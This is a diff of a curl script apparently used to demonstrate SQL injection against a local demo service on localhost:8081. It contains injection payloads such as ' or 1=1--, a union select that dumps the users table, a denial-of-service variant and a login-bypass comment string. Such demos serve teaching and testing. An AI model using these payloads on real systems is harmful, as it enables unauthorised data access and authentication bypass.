@@ -1,13 +1,16 @@
+# Get User
+curl 'localhost:8081/user?userId=10' | jq
+
 # normal
-curl -v 'localhost:8081/friends?userId=10' | jq
+curl 'localhost:8081/friends?userId=10' | jq
 
 # probe
 # ' or 1=1--
-curl -v 'localhost:8081/friends?userId=%27%20or%201%3D1--' | jq
+curl 'localhost:8081/friends?userId=%27%20or%201%3D1--' | jq
 
 # union
 # ' union select * from users--
-curl -v 'localhost:8081/friends?userId=1%27%20union%20select%20%2A%20from%20users--' | jq
+curl 'localhost:8081/friends?userId=1%27%20union%20select%20%2A%20from%20users--' | jq
 
 # DoS
 # 1' union select * from users;--
@@ -19,7 +22,7 @@ curl -v -X POST 'localhost:8081/login' -d '{ "email": "gopher@golang.org","passw
 
 # Login
 # Bad Password
-curl -v -X POST 'localhost:8081/login' -d '{ "email": "gopher@golang.org","password": "badpasword"}' | jq
+curl -sw 'Status Code: %{http_code}' -X POST 'localhost:8081/login' -d '{ "email": "gopher@golang.org","password": "badpasword"}'
 
 # Login Bypass
 # ' --
